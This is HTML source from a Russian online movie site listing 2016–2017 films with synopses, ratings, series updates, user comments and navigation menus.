+<div class="shortimg"><div id="news-id-6739" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488533203_ledikrovavyyboy.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488533203_ledikrovavyyboy.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488533203_ledikrovavyyboy.jpg" style="float:left;" alt='Леди Кровавый Бой (2017)' title='Леди Кровавый Бой (2017)'  /></a><!--TEnd-->Джейн Джонс – добрая и симпатичная девушка из США, которая, несмотря на милую внешность, умеет хорошо драться. Она старается избегать конфликтов с окружающими, но неприятности будто преследуют её, и она каждый раз вынуждена показывать своё умение постоять за себя. Однажды героиня получает приглашение поучаствовать в очень престижном, но опасном соревновании среди бойцов со всего мира, представляющих разные боевые искусства. Джейн, недолго думая, отправляется в Гонконг, где и будет проходить «Кумите». На этих соревнованиях собираются...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> Гонконг<br /><b>Жанр:</b> <a href="http://kinogo.club/boeviki/" >Боевик</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:36:31<br /><b>Премьера (РФ):</b> 10 февраля 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6739-ledi-krovavyy-boy-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Леди Кровавый Бой (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">3 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6738'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:61.2px;">3.6</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6738'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6738'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6738'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6738'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6738'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6738-voyna-2017.html">Война (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6738" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488438264_voyna.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488438264_voyna.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488438264_voyna.jpg" style="float:left;" alt='Война (2017)' title='Война (2017)'  /></a><!--TEnd-->Гэбриэл Драммер – отважный солдат и любящий семьянин, который оставляет свою супругу Натали, маленького сына и отправляется на войну. Он участвует в боевых операциях и смело выполняет любые, даже самые опасные миссии. В трудные для себя минуты, когда ему кажется, что преодолеть все препятствия он не сможет, герой вспоминает о своей семье, которая ждёт его возвращения дома. В Ираке морской пехотинец Габриэл не только переживает множество испытаний и узнаёт, что такое жестокость и боль, но и обзаводиться верными боевыми товарищами...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/trillery/" >Триллер</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:31:04<br /><b>Премьера (РФ):</b> 9 марта 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6738-voyna-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Война (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">2 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6737'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:56.1px;">3.3</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6737'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6737'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6737'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6737'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6737'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6737-mono-2016.html">Моно (2016)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6737" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488438022_mono.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488438022_mono.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488438022_mono.jpg" style="float:left;" alt='Моно (2016)' title='Моно (2016)'  /></a><!--TEnd-->Вайет является учеником школы Хайлэнд Парк и безуспешно пытается добиться популярности. Его же главное достижение – симпатичная девушка, с которой он встречается уже длительный период времени. Вот только совсем недавно она объявила, что бросает его и начинает строить отношения с одним из самых популярных парней в школе. Это стало для героя настоящим ударом, ведь теперь он, как и его друзья, может смело считать себя неудачником, на которого никто даже не обращает внимания. Вайета и его компанию не берут на дискотеки и не приглашают на вечеринки...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmi_2016/" >2016</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/komedii/" >Комедия</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:28:53<br /><b>Премьера (РФ):</b> 8 июля 2016</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6737-mono-2016.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Моно (2016) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">2 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div style="clear:both"></div>
+<div class="bot-left"><div class="bot-navigation"  align="center"><span>Раньше</span> <span>1</span> <a href="http://kinogo.club/page/2/">2</a> <a href="http://kinogo.club/page/3/">3</a> <a href="http://kinogo.club/page/4/">4</a> <a href="http://kinogo.club/page/5/">5</a> <a href="http://kinogo.club/page/6/">6</a> <a href="http://kinogo.club/page/7/">7</a> <a href="http://kinogo.club/page/8/">8</a> <a href="http://kinogo.club/page/9/">9</a> <a href="http://kinogo.club/page/10/">10</a> <span class="nav_ext">...</span> <a href="http://kinogo.club/page/559/">559</a> <a href="http://kinogo.club/page/2/">Позже</a></div></div></div>
+ 
+ 
+<div class="pomoshnik"></div>
+
+
+</div><!--content-->
+
+
+ 
+ <span class="leftblok_contener">
+
+  <div style="
+padding: 7px 20px;
+position: relative;
+border-bottom: 1px solid #3f413f;"><i style="font-size:15px;"> Панель навигации</i></div><!--div-->
+ 
+  <span class="leftblok_contener2">
+
+<div class="leftblok1">
+  
+  <div class="miniblock">
+
+
+     
+  <div class="mini" style="border-top:0px; padding-top:0px;">
+   <i style="font-size:14px;">Категории</i><br><br>
+    <a href="/biografiyi/">Биографии</a><br>
+	<a href="/boeviki/">Боевики</a><br>
+	<a href="/vesterny/">Вестерны</a><br>
+	<a href="/voennye/">Военные</a><br>
+	<a href="/detektivy/">Детективы</a><br>
+	<a href="/detskie/">Детские</a><br>
+	<a href="/dokumentalnye/">Документальные</a><br>
+	<a href="/dramy/">Драмы</a><br>
+	<a href="/istoricheskie/">Исторические</a><br>
+	<a href="/komedii/">Комедии</a><br>
+	<a href="/kriminal/">Криминал</a><br>
+	<a href="/melodramy/">Мелодрамы</a><br>
+	<a href="/multfilmy/">Мультфильмы</a><br>
+	<a href="/mjuzikly/">Мюзиклы</a><br>
+    <a href="/otechestvenie/">Отечественные</a><br>  
+	<a href="/prikljuchenija/">Приключения</a><br>
+	<a href="/semejnye/">Семейные</a><br>
+	<a href="/sportivnye/">Cпортивные</a><br>
+	<a href="/trillery/">Триллеры</a><br>
+	<a href="/uzhasy/">Ужасы</a><br>
+	<a href="/fantastika/">Фантастика</a><br>
+	<a href="/fjentjezi/">Фэнтези</a>
+     </div>
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="padding-top:20px;"></div><!--div-->
+ 
+
+
+     </div><!--miniblock-->
+     
+<!--div-->
+  
+</div><!--leftblok1-->
+
+
+
+<div class="leftblok2">
+
+   <div class="miniblock">
+
+
+     
+  <div class="mini" style="border-top:0px; padding-top:0px;">
+   <i style="font-size:14px;">По году</i><br><br>
+      <a href="/filmy_2015/">2015 года</a><br>
+      <a href="/filmi_2016/">2016 года</a><br>
+      <a href="/filmy_2017/">2017 года</a><br>
+ <div class="poloska"></div></div>
+
+
+
+
+
+
+
+
+
+
+ <div class="mini">  
+<i style="font-size:14px;">По странам</i><br><br>
+
+     <a href="/amerikanskie_filmy/">Американские</a><br>
+     <a href="/anglijskie_filmy/">Британские</a><br>
+     <a href="/russkie_filmy/">Российские</a><br>
+     <a href="/indijskie_filmy/">Индийские</a><br>
+     <a href="/nemeckie_filmy/">Немецкие</a><br>
+     <a href="/francuzskie_filmy/">Французские</a>
+
+
+<div class="poloska"></div></div>
+
+
+
+ <div class="mini">  
+<i style="font-size:14px;">Сериалы</i><br><br>
+<a href="/russkie_serialy/">Русские</a><br>
+<a href="/zarubezhnye_serialy/">Зарубежные</a><br>
+<a href="/turezkie_serialy/">Турецкие</a>
+       </div> 
+
+
+     </div><!--miniblock-->
+     
+
+     
+  
+</div><!--leftblok2-->
+
+
+
+ </span><!--leftblok_contener2-->
+
+     
+
+      
+   
+     
+     
+<div class="poloska_bloka"></div>
+
+<div style="padding: 7px 20px;
+position: relative;
+border-bottom: 1px solid #3f413f;"><i style="font-size:15px;">Скоро на сайте</i></div><!--div-->
+
+<div class="mimiserblock">
+    
+
+ <noindex><a href="http://kinogo.club/6695-prizraki-eloiz-2017.html" rel="nofollow"><li class="li_serial">
+
+    
+ <img src="/uploads/posts/2017-01/thumbs/1484930627_prizrakieloiz.jpg">
+
+<br />
+     Призраки Элоиз (2017)
+
+
+    
+     </li></a></noindex> <noindex><a href="http://kinogo.club/6683-krasavica-i-chudovische-2017.html" rel="nofollow"><li class="li_serial">
+
+    
+ <img src="/uploads/posts/2017-01/thumbs/1484294688_krasavicachudovische.jpg">
+
+<br />
+     Красавица и чудовище (2017)
+
+
+    
+     </li></a></noindex>
+
+    
+</div>
+
+     
+
+
+
+  
+   
+
+     
+<noindex><!--vk-->
+<div class="poloska_bloka_no"></div>
+<div class="mimiserblock_bn">
+    <ul>
+		<li class="li_block_rmb">
+   <script type="text/javascript" src="//vk.com/js/api/openapi.js?96"></script>
+
+<!-- VK Widget -->
+<div id="vk_groups"></div>
+<script type="text/javascript">
+VK.Widgets.Group("vk_groups", {mode: 1, width: "298", height: "250", color1: 'FFFFFF', color2: '2B587A', color3: '5B7FA6'}, 49655796);
+</script>
+		</li>
+    </ul>
+    </div>     
+    <!--/vk--></noindex> 
+     
+     
+<!--свежие сериалы -->
+<div class="poloska_bloka"></div>
+
+
+
+
+<div style="padding: 7px 20px;
+position: relative;
+border-bottom: 1px solid #3f413f;"><i style="font-size:15px;">Обновления сериалов</i></div><!--div-->
+
+
+
+<div class="mimiser">
+    <ul>
+         <a href="http://kinogo.club/6541-hodyachie-mertvecy-7-sezon.html" title="На планете уже несколько лет бушует страшный зомби-вирус, превращающий простых людей в кровожадных монстров. После начала эпидемии, которая очень быстро распространилась по всему миру, людям приходится выживать в тяжелейших условиях, а острая нехватка еды и прочих припасов привела к тому, что..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">7 сезон 12 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1477436246_hodyachiemertvecy7.jpg">
+
+<br />
+     Ходячие мертвецы<br />(7 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6540-dnevniki-vampira-8-sezon.html" title="Некоторое время назад, когда братья Стэфан и Дэймон Сальваторе только прибыли в городок Мистик Фоллз, в этом некогда спокойном месте стали происходить пугающие события. Всё дело в том, что братья самые настоящие вампиры, которые не похожи друг на друга, ведь один из них пытается мирно..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">8 сезон 15 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1477435253_dnevnikivampira8.jpg">
+
+<br />
+     Дневники вампира<br />(8 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6688-sannaya-loschina-4-sezons.html" title="Икабод Крейн был участником Гражданской войны и сражался на стороне Джорджа Вашингтона. Во время очередного сражения он получил смертельное ранение, но он не погиб, а переместился в будущее. Икабод оказался в нашем времени в городке под названием Сонная лощина. Он, используя свои навыки и знания,..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">4 сезон 9 серия</div></div>
+    
+ <img src="/uploads/posts/2017-01/thumbs/1484634184_sonnayaloschina4.jpg">
+
+<br />
+     Сонная Лощина<br />(4 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6535-sverhestestvennoe-12-sezon.html" title="Дин и Сэм Винчестеры – два родных брата, которые уже много лет занимаются тем, что путешествуют по разным городам Америки и сражаются с нечистью. За долгие годы своей непростой работы герои сразились уже с огромным количеством разного рода сверхъестественных сил, но каждый раз одерживали верх над..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">12 сезон 14 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1477061310_sverhestestvennoe12.jpg">
+
+<br />
+     Сверхъестественное<br />(12 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6508-strela-5-sezon.html" title="Когда-то наследник огромного денежного состояния Оливер Куин был простым избалованным мальчишкой, но пять лет, которые он провёл на загадочном острове, сделали его сильным и почти непобедимым воином. За эти годы с ним многое произошло, а когда он всё же вернулся в родной город Стар-сити, то стал..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">5 сезон 15 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1476167346_strela5.jpg">
+
+<br />
+     Стрела (5 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6728-sotnya-4-sezon.html" title="В далёком прошлом на Земле произошла страшная атомная катастрофа, сделавшая планету непригодной для жизни. Остаткам человечества удалось укрыться от опасности в космосе на специальной космической станции. Долгих 97 лет люди жили на «Ковчеге», но постепенно население выросло, припасы стали..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">4 сезон 5 серия</div></div>
+    
+ <img src="/uploads/posts/2017-02/thumbs/1487409773_sotnya4.jpg">
+
+<br />
+     Сотня (4 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6506-flesh-3-sezon.html" title="Недавно Барри Ален был простым парнем, который работал судмедэкспертом в полицейском департаменте, но его жизнь навсегда изменилась после аварии в научной лаборатории. Герой, оказавшись в самом эпицентре событий, обрёл невероятную силу – нечеловеческую скорость. Барри способен разгоняться до..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">3 сезон 14 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1475749243_flesh3.jpg">
+
+<br />
+     Флэш (3 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6731-legion-1-sezon.html" title="До определённого возраста Дэвид Хэллер казался совершенно нормальным человеком, но внезапно он стал видеть и слышать очень странные вещи. Парню поставили неутешительный диагноз диссоциативное расстройство личности, а после неудачной попытки совершить самоубийство его поместили в психиатрическую..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">1 сезон 4 серия</div></div>
+    
+ <img src="/uploads/posts/2017-02/thumbs/1487411877_legion.jpg">
+
+<br />
+     Легион (1 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6365-fors-mazhory-6-sezon.html" title="Майку Россу долгое время удавалось скрывать, что он не имеет юридического образования. Он вместе со своим другом и опытным коллегой Харви Спектром выиграл для своей фирмы большое количество дел и заработал огромные деньги. Но серьёзные проблемы начались в тот момент, когда прокуратура всерьёз им..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">Все серии</div></div>
+    
+ <img src="/uploads/posts/2016-07/thumbs/1468588957_forsmazhory6.jpg">
+
+<br />
+     Форс-мажоры<br />(6 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6584-smertelnoe-oruzhie-1-sezon.html" title="Полицейский из Техаса Мартин Риггс, привыкший в любой сложной ситуации действовать резко и без сомнений, недавно потерял в автомобильной аварии любимую супругу и своего будущего ребёнка. Это стало для него тяжелейшим ударом, после которого его поведение стало ещё более безрассудным. Мартин..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">1 сезон 16 серия</div></div>
+    
+ <img src="/uploads/posts/2016-11/thumbs/1478995148_smertelnoeoruzhie.jpg">
+
+<br />
+     Смертельное оружие (1 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6595-legendy-zavtrashnego-dnya-2-sezon.html" title="Не так давно капитан Рип Хантер начал бороться с временными преступниками, которые отправляются в прошлое, чтобы менять историю так, как угодно им самим. Он даже собрал для этого собственную команду, которая заняла место Хранителей времени, погибших после взрыва. В команду Легенд завтрашнего дня..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">2 сезон 12 серия</div></div>
+    
+ <img src="/uploads/posts/2016-11/thumbs/1479208192_legendyzavtrashnegodnya2.jpg">
+
+<br />
+     Легенды завтрашнего дня (2 сезон)
+
+
+    
+</li></a> <a href="http://kinogo.club/6507-vne-vremeni-1-sezon.html" title="На секретную базу, где проводятся современные исследования, пробирается группа террористов во главе с жестоким и умным Гарсией Флинтом и похищает машину времени. Преступники с неизвестными целями отправляются в 1937 год. АНБ обращается за помощью к преподавателю местного института Люси Престон и..."><li class="li_serial">
+<div class="lenta22"> 
+    <div class="edge-left22"></div><div class="cont22">1 сезон 16 серия</div></div>
+    
+ <img src="/uploads/posts/2016-10/thumbs/1475749724_vnevremeni.jpg">
+
+<br />
+     Вне времени<br />(1 сезон)
+
+
+    
+</li></a>
+     </ul>
+</div><!--div-->
+  
+
+     <!--/свежие сериалы -->
+     
+     
+<!--последние комменты -->
+<div class="poloska_bloka"></div>
+
+
+
+
+<div style="padding: 7px 20px;
+position: relative;
+border-bottom: 1px solid #3f413f;"><i style="font-size:15px;"> Последние комментарии</i></div><!--div-->
+
+
+
+<div style="border-top: 1px solid #848480; padding-top: 15px;">
+    <ul class="lastcomm"><div class=lastkomment><b><a href="/6738-voyna-2017.html" title="Война (2017)">Война (2017)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('OlegKuz', '/user/OlegKuz/'); return false;" href="/user/OlegKuz/">OlegKuz</a></span>: Цитата: TalkerBirdНастоящее название &quot;...
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/6656-dom-naprotiv-2016.html" title="Дом напротив (2016)">Дом напротив (2016)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('%CA%E0%E9+%C1%F0%FE%ED%E5%ED%E4%E6%E8', '/user/%CA%E0%E9+%C1%F0%FE%ED%E5%ED%E4%E6%E8/'); return false;" href="/user/%CA%E0%E9+%C1%F0%FE%ED%E5%ED%E4%E6%E8/">Кай Брюненджи</a></span>: Фильм туповат и нет в нем ничего необычно, нового. Однако, сделан хорошо, атмосферно, часто держит в напряжении. Но к ужасам не имеет вообще...
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/675-pohozhdeniya-prizraka-2012.html" title="Похождения призрака (2012)">Похождения призрака (2012)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('MarinkaSl', '/user/MarinkaSl/'); return false;" href="/user/MarinkaSl/">MarinkaSl</a></span>: Фэнтези? Это &quot;чёрная комедия&quot; для подростков и иже с ними. Посмотреть можно, бывает смешно. На уровне &quot;Ералаша&quot;. Я не из...
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/5670-dom-straha-2015.html" title="Дом страха (2015)">Дом страха (2015)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('Bitanem', '/user/Bitanem/'); return false;" href="/user/Bitanem/">Bitanem</a></span>: Ну, честно сказать, такой средненький фильм. На раз посмотреть в принципе интересно. Главный герой действительно подкумаривал, играет плохо....
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/6742-horoshie-deti-2016.html" title="Хорошие дети (2016)">Хорошие дети (2016)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('Reampul', '/user/Reampul/'); return false;" href="/user/Reampul/">Reampul</a></span>: Хорошая комедия. Местами смешная, нелепая и комичная. Давно не смотрел такой доброй американской комедии. Советую у просмотру.
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/6577-obitel-zla-6-poslednya-glava-2017.html" title="Обитель зла 6: Последняя глава (2017)">Обитель зла 6: Последняя глава (2017)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('chizhik22', '/user/chizhik22/'); return false;" href="/user/chizhik22/">chizhik22</a></span>: По мне, так фильм можно посмотреть, если делать нечего совсем, а делать что-то нужно). Скучный и предсказуемый. Хотя чего еще было ждать,ког...
+<div class=poloska2></div></div><div class=lastkomment><b><a href="/5490-zheleznyy-kulak-2-2015.html" title="Железный кулак 2 (2015)">Железный кулак 2 (2015)</a></b><br>
+    <span style="color:#E0DFDC"><a onclick="ShowProfile('%C2%FF%F7%E5%F1%EB%E0%E204101985', '/user/%C2%FF%F7%E5%F1%EB%E0%E204101985/'); return false;" href="/user/%C2%FF%F7%E5%F1%EB%E0%E204101985/">Вячеслав04101985</a></span>: Похуже первой части, но смотреть всё же можно. Хорошая разгрузка для мозгов. Судить предвзято сюжет и сценарий я бы не стал. Вполне соответс...
+<div class=poloska2></div></div></ul></div><!--div-->
+
+     <!--/последние комменты -->
+     
+
+
+
+
+     
+     
+     
+
+
+ </span><!--leftblok_contener3-->
+
+</div><!--contener2-->
+</div><!--contener-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="header">
+
+
+
+
+
+
+	<div class="header44">
+			
+		
+				
+						<div class="main_menu">
+			        <a href="/"><img src="/templates/kinogo/images/kinogo.png" width="91" height="26"></a> </div>
+                    
+                    
+                    
+
+                 	<div class="social">   
+              <script type="text/javascript" src="//yandex.st/share/share.js" charset="utf-8"></script>
+<div class="yashare-auto-init" data-yashareL10n="ru" data-yashareType="none" data-yashareQuickServices="vkontakte,facebook,twitter,odnoklassniki,moimir"></div> 
+</div>
+      
+				
+
+          
+
+  <div class="search_panel">
+  
+  
+  
+
+   
+    	 <span class="searchbar"> 	
+       	 
+  
+       <form action="" name="searchform" method="post">
+           <input name="titleonly" value="3" type="hidden">
+      <input type="hidden" name="do" value="search">
+      <input type="hidden" name="subaction" value="search">
+          <input id="story" name="story" value="Поиск" onblur="if(this.value==&#39;&#39;) this.value=&#39;Поиск&#39;;" onfocus="if(this.value==&#39;Поиск&#39;) this.value=&#39;&#39;;" type="text">
+    
+ <button class="fbutton2" onclick="submit();" type="submit" title="ok" style="float: right;"><span>ok</span></button>
+ 
+    </form> </span>
+ 
+  </div>
+  
+  
+  
+  
+
+<div class="user_panel">
+<div class="loginin" >
+
+
+
+
+
+
+
+		
+        
+        
+   <script>
+function change(idName) {
+  if(document.getElementById(idName).style.display=='none') {
+    document.getElementById(idName).style.display = '';
+  } else {
+    document.getElementById(idName).style.display = 'none';
+  }
+  return false;
+}
+</script>
+
+<a href="#" onclick="change('test')">Вход</a> / <a href="/index.php?do=register">Регистрация</a>  
+        
+        
+        
+        
+        
+        
+        
+			
+		
+
+
+
+
+</div>
+
+<div style="display:none; float:left; padding-left: 10px; padding-top: 4px;" id="test">
+
+
+<form method="post" action="">
+			
+<label for="login_name">Логин: </label><input type="text" name="login_name" id="login_name" style="width: 60px;"/>
+
+
+<label for="login_password">Пароль (<a href="/index.php?do=lostpassword">Забыли?</a>): </label><input type="password" name="login_password" id="login_password"  style="width: 60px;"/>&nbsp;
+
+<button class="fbutton2" onclick="submit();" type="submit" title="Войти"><span>Войти</span></button>
+
+
+
+					<input name="login" type="hidden" id="login" value="submit" />
+			
+		</form>
+            
+ </div>
+</div>
+
+  		
+		</div>
+        
+        
+      
+        
+
+
+
+
+
+	
+
+<div class="header55">
+
+
+
+
+
+
+
+<div class="leftblok1_header">
+
+
+<div class="navigation">
+
+<div class="topmenu">
+
+
+
+
+ 
+ 
+
+</div><!--topmenu-->
+
+
+<div class="deepnavigation">
+
+
+
+
+
+<table class="menu">
+  <tbody><tr>
+    
+      <td class="item">
+      	
+      	
+          <a href="/"><span class="name">Главная</span></a>
+        
+      </td>
+      <td class="item">
+      	
+      	
+        	<a href="/filmy_2017/"><span class="name">Новинки</span></a>
+        
+      </td>    
+
+      
+
+   <td class="item">
+      	
+      	
+          <a href="/index.php?do=orderdesc"><span class="name">Стол заказов</span></a>
+        
+      </td>
+  
+      
+      <td class="item">
+      	
+      	
+          <a href="/faq-vopros-otvet.html"><span class="name">Помощь</span></a>
+        
+      </td>
+      
+      
+      
+       
+    
+  </tr>
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+
+
+
+</div><!--deepnavigation-->
+</div><!--navigation-->
+
+
+
+
+
+
+
+</div><!--leftblok1_header-->
+
+
+
+</div><!--header44-->
+
+
+
+
+
+
+ <div style="clear:both"></div>
+
+
+
+<div class="horizontal2">
+        <div class="horizontal"> 
+        
+          <div class="carousel">
+            <a class="carousel_prev carousel_left" href="">prev</a>
+            <div class="carousel_container">
+              <ul class="portfolio_items">
+                <li><div class="inner"><a href="http://kinogo.club/6575-kredo-ubiycy-2017.html" title="Кредо убийцы (2017)"><img src="/uploads/posts/2016-11/thumbs/1478876170_kredoubiycy.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6574-passazhiry-2016.html" title="Пассажиры (2016)"><img src="/uploads/posts/2016-11/thumbs/1478875912_passazhiry.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6577-obitel-zla-6-poslednya-glava-2017.html" title="Обитель зла 6: Последняя глава (2017)"><img src="/uploads/posts/2016-11/thumbs/1478876562_obitelzlaposlednyaaglava.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6572-pribytie-2016.html" title="Прибытие (2016)"><img src="/uploads/posts/2016-11/thumbs/1478875558_pribytie.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6676-chudo-na-gudzone-2016.html" title="Чудо на Гудзоне (2016)"><img src="/uploads/posts/2017-01/thumbs/1483500824_chudonagudzone.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6578-velikaya-stenas-2017.html" title="Великая стена (2017)"><img src="/uploads/posts/2016-11/thumbs/1478876732_velikayastena.jpg" width="118"></a></div></li>
+<li><div class="inner"><a href="http://kinogo.club/6258-zvezdnye-voynye-8-izgoy-odin-2016.html" title="Звёздные войны 8. Истории: Изгой-один (2016)"><img src="/uploads/posts/2016-12/thumbs/1481888688_zvezdnyevoyny8.jpg" width="118"></a></div></li>
+
+                <li><div class="inner"><a href="http://kinogo.club/6610-po-soobrazheniyam-sovestie-2016.html" title="По соображениям совести (2016)"><img src="/uploads/posts/2016-11/thumbs/1479485978_posoobrazheniyamsovesti.jpg" width="118"></a></div></li>
